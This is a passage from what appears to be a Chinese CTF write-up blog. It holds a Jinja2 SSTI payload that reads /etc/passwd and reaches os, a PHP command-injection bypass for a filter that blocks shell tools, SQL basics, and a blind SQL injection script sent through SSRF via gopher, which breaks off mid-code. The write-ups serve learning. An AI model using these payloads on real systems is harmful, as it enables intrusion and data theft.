class="hljs-title">difflib</span>.<span class="hljs-title">HtmlDiff</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">RuleFactory</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">RuleTemplate</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">BaseConverter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">Map</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">MapAdapter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">_compat</span>.<span class="hljs-title">_FixupStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">_compat</span>.<span class="hljs-title">_AtomicFile</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">LazyFile</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">KeepOpenFile</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">PacifyFlushWrapper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">types</span>.<span class="hljs-title">ParamType</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">Option</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">Argument</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">ParsingState</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">OptionParser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">formatting</span>.<span class="hljs-title">HelpFormatter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">core</span>.<span class="hljs-title">Context</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">core</span>.<span class="hljs-title">BaseCommand</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">core</span>.<span class="hljs-title">Parameter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">signals</span>.<span class="hljs-title">Namespace</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">signals</span>.<span class="hljs-title">_FakeSignal</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">helpers</span>.<span class="hljs-title">locked_cached_property</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">helpers</span>.<span class="hljs-title">_PackageBoundObject</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">cli</span>.<span class="hljs-title">DispatchingApp</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">cli</span>.<span class="hljs-title">ScriptInfo</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">config</span>.<span class="hljs-title">ConfigAttribute</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">ctx</span>.<span class="hljs-title">_AppCtxGlobals</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">ctx</span>.<span class="hljs-title">AppContext</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">ctx</span>.<span class="hljs-title">RequestContext</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">json</span>.<span class="hljs-title">tag</span>.<span class="hljs-title">JSONTag</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">json</span>.<span class="hljs-title">tag</span>.<span class="hljs-title">TaggedJSONSerializer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">sessions</span>.<span class="hljs-title">SessionInterface</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">json</span>.<span class="hljs-title">_JSONModule</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">json</span>.<span class="hljs-title">JSONMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">blueprints</span>.<span class="hljs-title">BlueprintSetupState</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">serving</span>.<span class="hljs-title">WSGIRequestHandler</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">ext</span>.<span class="hljs-title">Extension</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">ext</span>.<span class="hljs-title">_CommentFinder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">serving</span>.<span class="hljs-title">_SSLContext</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">serving</span>.<span class="hljs-title">BaseWSGIServer</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">unicodedata</span>.<span class="hljs-title">UCD</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">array</span>.<span class="hljs-title">array</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">debug</span>.<span class="hljs-title">TracebackFrameProxy</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">debug</span>.<span class="hljs-title">ProcessedTraceback</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">_TestCookieHeaders</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">_TestCookieResponse</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">EnvironBuilder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">Client</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">method</span>-<span class="hljs-title">wrapper</span>&#x27;&gt;]</span><br></code></pre></td></tr></table></figure><p><strong>可以看到有一个type file类型(可以进行文件读取)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; [].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;<br></code></pre></td></tr></table></figure><p>webflask4](D:\blog\pict\webflask4.png</p><p><strong>可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>D:\blog\pict\webflask5.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="2-favorit-number"><a href="#2-favorit-number" class="headerlink" title="2.favorit_number"></a>2.favorit_number</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//php5.5.9</span><br><span class="hljs-variable">$stuff</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;stuff&quot;</span>];<br><span class="hljs-variable">$array</span> = [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$stuff</span> === <span class="hljs-variable">$array</span> &amp;&amp; <span class="hljs-variable">$stuff</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;  <span class="hljs-comment">#此处可用php5.5.9数组绕过，数组中键值为0的元素与键值为4294967296 //0x100000000 的元素是同一个</span><br>    <span class="hljs-variable">$num</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/^\d+$/im&quot;</span>,<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="hljs-variable">$num</span>))&#123;       <span class="hljs-comment">//这里进行了一个过滤，可以使用打开文件inum的方法</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;my favorite num is:&quot;</span>;                 <span class="hljs-comment">//以及%0a截断</span><br>            system(<span class="hljs-string">&quot;echo &quot;</span>.<span class="hljs-variable">$num</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Bonjour!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#数组中键值为0的元素与键值为4294967296 //0x100000000 的元素是同一个</span><br></code></pre></td></tr></table></figure><p>D:\blog\pict\favonum1.png</p><p>所以绕过第一个if就需要构造stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123,成功绕过</p><p>D:\blog\pict\favonum2.png</p><p>在num处执行命令ls ./</p><p>D:\blog\pict\favonum3.png</p><p>ls ../../../../</p><p>D:\blog\pict\favonum4.png</p><p>ls / -i</p><p>D:\blog\pict\favonum5.png</p><p>tac <code>find / -inum=7342887</code></p><p>D:\blog\pict\favonum6.png</p>]]></content>
    
    
    <categories>
      
      <category>not a big deal</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp orz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2022/01/13/sql/"/>
    <url>/2022/01/13/sql/</url>
    
    <content type="html"><![CDATA[<p>some ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> 列名称 <span class="hljs-keyword">FROM</span> 表名称<br><span class="hljs-keyword">SELECT</span> Company <span class="hljs-keyword">FROM</span> Orders<br><br># Company 列中仅选取唯一不同的值<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> Company <span class="hljs-keyword">FROM</span> Orders <br><br>#如果只希望选取居住在城市 &quot;Beijing&quot; 中的人，我们需要向 <span class="hljs-keyword">SELECT</span> 语句添加 <span class="hljs-keyword">WHERE</span> 子句：<span class="hljs-keyword">where</span>还可以添加各种运算符控制查询条件<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> City<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Beijing&#x27;</span>，字符加引号，数字不要加<br><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> FirstName<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Thomas&#x27;</span> <span class="hljs-keyword">AND</span> LastName<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Carter&#x27;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> firstname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Thomas&#x27;</span> <span class="hljs-keyword">OR</span> lastname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Carter&#x27;</span><br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>  用于根据指定列队结果进行排序，默认按照升序，降序用   <span class="hljs-keyword">desc</span><br><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company<br><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company <span class="hljs-keyword">desc</span><br><br>#向表中插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 表名称 <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)<br>#向表中指定列插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (列<span class="hljs-number">1</span>, 列<span class="hljs-number">2</span>,...) <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)<br><br><br>UPDATE 表名称 <span class="hljs-keyword">SET</span> 列名称 <span class="hljs-operator">=</span> 新值 <span class="hljs-keyword">WHERE</span> 列名称 <span class="hljs-operator">=</span> 某值<br>UPDATE Person <span class="hljs-keyword">SET</span> Address <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Zhongshan 23&#x27;</span>, City <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Nanjing&#x27;</span><br><span class="hljs-keyword">WHERE</span> LastName <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wilson&#x27;</span><br><br><br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> Person <span class="hljs-keyword">WHERE</span> LastName <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wilson&#x27;</span> <br>#可以在不删除表的情况下删除所有的行。这意味着表的结构、属性和索引都是完整的：<br><span class="hljs-keyword">DELETE</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_name<br><br><br><span class="hljs-keyword">where</span> city <span class="hljs-keyword">like</span> <span class="hljs-comment">-----筛选列中的元素</span><br><span class="hljs-keyword">where</span> city <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-comment">-----模糊查找</span><br><span class="hljs-operator">%</span>代表<span class="hljs-number">0</span>个或者多个字符<br>_代表一个字符<br>[charlist]字符列中任何一个字符<br>[<span class="hljs-operator">^</span>charlist]不在字符列中的任何字符<br><br><br><span class="hljs-keyword">between</span>:<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2<br>#范围之外：<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2<br><br><br>#换别名显示：<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">AS</span> alias_name<br><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">AS</span> alias_name <span class="hljs-keyword">FROM</span> table_name<br><br><br>#从两个表中查询信息并显示在一起，最后一行使俩id相等显示<br><span class="hljs-keyword">SELECT</span> Persons.LastName, Persons.FirstName, Orders.OrderNo<br><span class="hljs-keyword">FROM</span> Persons, Orders<br><span class="hljs-keyword">WHERE</span> Persons.Id_P <span class="hljs-operator">=</span> Orders.Id_P <br><br></code></pre></td></tr></table></figure><p>BLIND SQL:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload =\</span><br><span class="hljs-comment"># &quot;&quot;&quot;POST /xxxxx HTTP/1.1</span><br><span class="hljs-comment"># Host: xxxx</span><br><span class="hljs-comment"># Content-Length: 48</span><br><span class="hljs-comment"># Cache-Control: max-age=0</span><br><span class="hljs-comment"># Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment"># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="hljs-comment"># Origin: xxxx</span><br><span class="hljs-comment"># Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment"># Referer: xxxxx</span><br><span class="hljs-comment"># Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment"># Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment"># Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span><br><span class="hljs-comment"># Connection: close</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br><span class="hljs-comment"># #爆数据库名</span><br><span class="hljs-comment"># basename=&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(1,4):</span><br><span class="hljs-comment">#     number = 65</span><br><span class="hljs-comment">#     while(number&lt;123):</span><br><span class="hljs-comment">#         insert=&quot;id=1/**/and/**/ascii(substr(database(),%d,1))=%d&quot; %(i,number)</span><br><span class="hljs-comment">#         # insert = &quot;id=1/**/and/**/ascii(substr(database(),1,1))=&#123;&#125;&quot;.format((str)(number))</span><br><span class="hljs-comment">#         # print(insert)</span><br><span class="hljs-comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span><br><span class="hljs-comment">#         # print(payload)</span><br><span class="hljs-comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="hljs-comment">#         tmp = urllib.parse.quote(payloads)</span><br><span class="hljs-comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="hljs-comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="hljs-comment">#         # 请求网页</span><br><span class="hljs-comment">#         url = &#x27;xxxxxx&#x27;</span><br><span class="hljs-comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span><br><span class="hljs-comment">#         # print(data)</span><br><span class="hljs-comment">#         req = requests.post(url=url, data=data)</span><br><span class="hljs-comment">#         if(&#x27;meow&#x27; in req.text):</span><br><span class="hljs-comment">#             print(&#x27;ok&#x27;,chr(number))</span><br><span class="hljs-comment">#             basename=basename+chr(number)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             number = number + 1</span><br><span class="hljs-comment">#     i=i+1</span><br><span class="hljs-comment"># 114 117 97 rua</span><br><span class="hljs-comment"># print(basename)</span><br>basename=<span class="hljs-string">&#x27;rua&#x27;</span><br><br><span class="hljs-comment">#爆表名</span><br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /xxxxx HTTP/1.1</span><br><span class="hljs-string">Host: xxxxxx</span><br><span class="hljs-string">Content-Length: 77</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="hljs-string">Origin: xxxxxx</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Referer: xxxxxxx</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># i=1</span><br><span class="hljs-comment"># while(i&lt;10):</span><br><span class="hljs-comment">#     number = 65</span><br><span class="hljs-comment">#     while(number&lt;123):</span><br><span class="hljs-comment">#         insert = &quot;id=1/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),%d,1))=%d&quot;%(i,number)</span><br><span class="hljs-comment">#         # print(insert)</span><br><span class="hljs-comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span><br><span class="hljs-comment">#         # print(payload)</span><br><span class="hljs-comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="hljs-comment">#         tmp = urllib.parse.quote(payloads)</span><br><span class="hljs-comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="hljs-comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="hljs-comment">#         # 请求网页</span><br><span class="hljs-comment">#         url = &#x27;xxxxxxx&#x27;</span><br><span class="hljs-comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span><br><span class="hljs-comment">#         # print(data)</span><br><span class="hljs-comment">#         req = requests.post(url=url, data=data)</span><br><span class="hljs-comment">#         # print(req.text)</span><br><span class="hljs-comment">#         if(&#x27;meow&#x27; in req.text):</span><br><span class="hljs-comment">#             print(&#x27;yes&#x27;,chr(number),i)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             number = number + 1</span><br><span class="hljs-comment">#     i=i+1</span><br><span class="hljs-comment"># 114 117 97 rua</span><br><span class="hljs-comment"># print(basename)</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#nothing</span><br>final=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    number=<span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span>(number&lt;<span class="hljs-number">128</span>):<br>        insert = <span class="hljs-string">&quot;id=1/**/and/**/ascii(substr((select/**/flag/**/from/**/rua.flag),%d,1))=%d&quot;</span>%(i,number)<br>        <span class="hljs-comment"># print(insert)</span><br>        payloads=payload+<span class="hljs-string">&#x27;\n&#x27;</span>+insert+<span class="hljs-string">&#x27;\n&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span 